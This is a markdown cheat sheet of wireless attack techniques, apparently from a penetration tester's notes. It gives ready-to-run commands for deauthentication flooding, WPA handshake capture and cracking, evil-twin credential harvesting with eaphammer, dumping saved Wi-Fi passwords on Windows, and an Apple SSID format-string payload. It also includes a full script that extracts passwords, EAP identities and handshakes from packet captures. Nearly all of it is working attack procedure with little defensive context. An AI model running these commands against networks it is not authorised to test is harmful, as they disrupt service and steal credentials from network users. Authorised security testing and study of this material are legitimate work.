# Wireless Attacks

- [Resources](#resources)

## Table of Contents

- [Aircrack-ng](#aircrack-ng)
- [airodump-ng](#airodump-ng)
- [airmon-ng](#airmon-ng)
- [ALFA AWUS036ACH](#alfa-awus036ach)
- [Apple Wi-Fi Evil SSID](#apple-wi-fi-evil-ssid)
- [eaphammer](#eaphammer)
- [iw](#iw)
- [mdk3](#mdk3)
- [Microsoft Windows](#microsoft-windows)
- [pcapFilter.sh](#pcapfiltersh)
- [Wi-Fi Example Attack](#wi-fi-example-attack)
- [wpa_supplicant](#wpa_supplicant)
- [WPS-PSK Example Attack](#wps-psk-example-attack)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Aircrack-ng | WiFi security auditing tools suite | https://github.com/aircrack-ng/aircrack-ng |
| airgeddon | This is a multi-use bash script for Linux systems to audit wireless networks. | https://github.com/v1s1t0r1sh3r3/airgeddon |
| AngryOxide | 802.11 Attack Tool | https://github.com/Ragnt/AngryOxide |
| EAPHammer | EAPHammer is a toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks. | https://github.com/s0lst1c3/eaphammer |
| Flipper | Playground (and dump) of stuff I make or modify for the Flipper Zero | https://github.com/UberGuidoZ/Flipper |
| flipperzero-firmware | Flipper Zero Code-Grabber Firmware | https://github.com/Eng1n33r/flipperzero-firmware |
| flipperzero-firmware-wPlugins | Flipper Zero FW [ROGUEMASTER] | https://github.com/RogueMaster/flipperzero-firmware-wPlugins |
| JackIt | JackIt - Exploit Code for Mousejack Resources | https://github.com/insecurityofthings/jackit |
| OneShot | Run WPS PIN attacks (Pixie Dust, online bruteforce, PIN prediction) without monitor mode with the wpa_supplicant | https://github.com/kimocoder/OneShot |
| Pwnagotchi | (⌐■_■) - Deep Reinforcement Learning instrumenting bettercap for WiFi pwning. | https://github.com/evilsocket/pwnagotchi |
| WEF | A fully offensive framework to the 802.11 networks and protocols with different types of attacks for WPA/WPA2 and WEP, automated hash cracking, bluetooth hacking and much more. | https://github.com/D3Ext/WEF |
| Wifite | This repo is a complete re-write of wifite, a Python script for auditing wireless networks. | https://github.com/derv82/wifite2 |

## Aircrack-ng

```console
$ tshark -F pcap -r <FILE>.pcapng -w <FILE>.pcap
$ aircrack-ng -w /usr/share/wordlists/rockyou.txt <FILE>.pcap
```

## airodump-ng

```console
$ sudo airodump-ng <INTERFACE>mon
```

## airmon-ng

```console
$ sudo airmon-ng check kill
$ sudo airmon-ng start <INTERFACE>
$ sudo airmon-ng stop <INTERFACE>
```

## ALFA AWUS036ACH

```console
$ sudo apt-get install realtek-rtl88xxau-dkms
```

## Apple Wi-Fi Evil SSID

```console
%p%s%s%s%s%n
```

## eaphammer

### Import Certificates

```console
python3 ./eaphammer --cert-wizard import --server-cert /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt --ca-cert /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt --private-key /PATH/TO/KEY/<KEY>.key --private-key-passwd <PASSWORD>
```

### Evil Twin Attack

```console
$ python3 ./eaphammer -i <INTERFACE> --auth wpa-eap --essid <SSID> --creds --negotiate balanced
```

```console
$ airdecap-ng -e <SSID> -p <PASSWORD> <FILE>.cap 
```

## iw

```console
$ iwconfig
$ iw <INTERFACE> scan
```

## mdk3

> https://github.com/charlesxsh/mdk3-master

```console
$ sudo mdk3 <INTERFACE>mon d -c <CHANNEL_NUMBER>
$ sudo mdk3 <INTERFACE>mon d <BSSID>
$ sudo mdk3 <INTERFACE>mon b <BSSID>
```

## Microsoft Windows

### Wireless Profiles

#### List Profiles

```cmd
PS C:\> netsh wlan show profiles
```

#### Extract Passwords

```cmd
PS C:\> netsh wlan show profile name="<PROFILE>" key=clear
```

#### Export Profiles

```cmd
PS C:\> netsh wlan export profile name="<PROFILE>" folder=C:\temp
```

## pcapFilter.sh

> https://gist.githubusercontent.com/r4ulcl/f3470f097d1cd21dbc5a238883e79fb2/raw/78e097e1d4a9eb5f43ab0b2763195c04f02c4998/pcapFilter.sh

```console
#!/bin/bash

#author         : Raul Calvo Laorden (me@r4ulcl.com)
#description    : Script to get WPA-EAP Identities, EAP certs, HTTP passwords, Handshakes, DNS queries, NBTNS queries and LLMNR queries
#date           : 2021-06-24
#usage          : bash pcapFilter.sh -f <pcap/folder> [options]
#-----------------------------------------------------------------------------------------------------------

red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`
#echo "${red}red text ${green}green text${reset}"


help () {
	echo "$0 -f <pcap/folder> [OPTION]

	-f <.pcap>: Read pcap or file of .caps
	-h : help

	OPTIONS:
		-A : all
		-P : Get HTTP POST passwords (HTTP)
		-I : Filter WPA-EAP Identity
		-C : Export EAP certs
		-H : Get Handshakes 1 and 2
		-D : Get DNS querys
		-R : Responder vulnerable protocols (NBT-NS + LLMNR)
		-N : Get NBT-NS querys
		-L : Get LLMNR querys
	"

}

filter () {

	echo -e "\n${green}FILE: $FILE${reset}"

	if [ ! -z "$ALL" ] ; then
		PASSWORDS=true
		IDENTITY=true
		HANDSHAKES=true
		DNS=true
		NBTNS=true
		LLMNR=true
		CERT=true
	fi

	if [ ! -z "$PASSWORDS" ] ; then
		echo -e "\n\tGet POST passwords\n"
		tshark -r $FILE -Y 'http.request.method == POST and (lower(http.file_data) contains "pass" or lower(http.request.line) contains "pass" or tcp contains "login")' -T fields -e http.file_data -e http.request.full_uri
		# basic auth?
	fi

	if [ ! -z "$IDENTITY" ] ; then
		echo -e "\n\tGet WPA-EAP Identities\n"
		echo -e 'DESTINATION\t\tSOURCE\t\t\tIDENTITY'
		tshark -nr $FILE -Y "eap.type == 1  && eap.code == 2" -T fields -e wlan.da -e wlan.sa -e eap.identity 2> /tmp/error | sort -u
		cat /tmp/error
	fi

	if [ ! -z "$HANDSHAKES" ] ; then
		echo -e "\n\tGet Handshakes in pcap\n"
		tshark -nr $FILE -Y "wlan_rsna_eapol.keydes.msgnr == 1 or wlan_rsna_eapol.keydes.msgnr == 2"
	fi

	if [ ! -z "$DNS" ] ; then
		echo -e "\n\tGet DNS querys\n"
		tshark -nr $FILE -Y "dns.flags == 0x0100" -T fields -e ip.src -e dns.qry.name
	fi

	if [ ! -z "$NBTNS" ] ; then
		echo -e "\n\tGet NBTNS querys in file to responder\n"
		tshark -nr $FILE -Y "nbns" -T fields -e ip.src -e nbns.name
	fi

	if [ ! -z "$LLMNR" ] ; then
		echo -e "\n\tGet LLMNR querys in file to responder\n"
		tshark -nr $FILE -Y "llmnr" -T fields -e ip.src -e dns.qry.name
	fi

	# https://gist.github.com/Cablethief/a2b8f0f7d5ece96423ba376d261bd711
	if [ ! -z "$CERT" ] ; then
		tmpbase=$(basename  $FILE)
		mkdir /tmp/certs/

		tshark -r $FILE \
		           -Y "ssl.handshake.certificate and eapol" \
		           -T fields -e "tls.handshake.certificate" -e "wlan.sa" -e "wlan.da" | while IFS= read -r line; do
			CERT=`echo $line | awk '{print $1}'`
			SA=`echo $line | awk '{print $2}'`
			DA=`echo $line | awk '{print $3}'`

			FILETMP=$(mktemp $tmpbase-$SA-$DA.cert.XXXX.der)

			echo -e "\n\n${green}Certificate from $SA to $DA ${reset}"
			echo -e "${green}Saved certificate in the file /tmp/certs/$FILETMP ${reset}"

			echo $CERT | \
			sed "s/://g" | \
			xxd -ps -r | \
			tee /tmp/certs/$FILETMP | \
			openssl x509 -inform der -text;

			rm $FILETMP
		done

		echo -e "\n\n${green}All certs saved in the /tmp/certs/ directory${reset}"

	fi
}

if [ ! -x $(which tshark) ]; then
  echo "${red}tshark not installed${reset}"
  exit 0
fi

while getopts hf:APIHDRNLC flag
do
    case "${flag}" in
        h) HELP=true;;
        f) INPUT=${OPTARG};;
        A) ALL=true;;
        P) PASSWORDS=true;;
        I) IDENTITY=true;;
        H) HANDSHAKES=true;;
        D) DNS=true;;
        R) NBTNS=true;LLMNR=true;;
        N) NBTNS=true;;
        L) LLMNR=true;;
	C) CERT=true;;
    esac
done

if [ "$HELP" = true ] ;
then
	help
	exit 0
fi

if [ -z "$INPUT" ] ; then
	echo "File or folder needed"
	echo
	help
	exit 1
fi


if [ -z "$ALL" ] && [ -z "$PASSWORDS" ] && [ -z "$IDENTITY" ] && [ -z "$HANDSHAKES" ] && [ -z "$DNS" ] && [ -z "$NBTNS" ] && [ -z "$LLMNR" ] && [ -z "$CERT" ]; then
	echo "Argument needed"
	help
	exit 2
fi

if [ "$#" -lt 3 ]; then
        echo "Argument needed"
        help
        exit 2
fi

#Check if INPUT is a folder
if [[ -d "$INPUT" ]]
then
	for F in $INPUT/*cap ; do
		if [ -f "$F" ] ; then
			FILE=$F
			filter
		else
			echo "${red}Warning: Some problem with \"$F\"${reset}"
		fi
	done
else
	FILE=$INPUT
	filter
fi


# # TODO
#- Passwords: basic auth, FTP, TFTP, SMB, SMB2, SMTP, POP3, IMAP
```

```console
$ ./pcapFilter.sh -A -f <FILE>
```

## Wi-Fi Example Attack

```console
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0
$ sudo airodump-ng wlan0mon
$ sudo airodump-ng -w <FILE> -c <CHANNEL> --bssid <BSSID> wlan0mon
```

```console
$ sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
```

```console
$ aircrack-ng <FILE>.cap -w /usr/share/wordlists/rockyou.txt
```

```console
$ sudo airmon-ng stop wlan0mon
```

## wpa_supplicant

### wpa_supplicant.conf

```console
$ echo 'ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1

network={
    ssid="<SSID>"
    psk="<PSK>"
}' > /etc/wpa_supplicant.conf
```

```console
$ wpa_supplicant -B -D wext -i <INTERFACE> -c /etc/wpa_supplicant.conf
```

```console
$ ip link set <INTERFACE> up
```

```console
$ dhclient -h
```

## wpa_supplicant

### Connect to a Wi-Fi Network

#### Configuration File

```console
network={
    ssid="<SSID>"
    psk="<PASSWORD>"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

or

```console
network={
    ssid="<SSID>"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="<USERNAME>"
    password="<PASSWORD>"
    phase2="auth=MSCHAPV2"
    ca_cert="/PATH/TO/CERTIFICATE/<CERTIFICATE>.crt"
}
```

#### Establishing Connection

```console
$ wpa_supplicant -D nl80211 -i <INTERFACE> -c <CONFIGURATION_FILE>
```

#### IP Address Request

```console
$ dhclient <INTERFACE> -v 
```

## WPS-PSK Example Attack

```console
$ airmon-ng start <INTERFACE>
```console

```console
$ airodump-ng <INTERFACE>mon -w <FILE> -c <CHANNEL> --wps
```

```console
$ iwconfig <INTERFACE>mon channel <CHANNEL>
```

```console
$ aireplay-ng -0 <CHANNEL> -a <MAC_ADDRESS> <INTERFACE>mon
```

```console
$ aircrack-ng -w /PATH/TO/WORDLIST/<WORDLIST> <FILE> 
```

```console
$ airdecap-ng -e <SSID> -p <PASSWORD> <FILE>.cap 
```
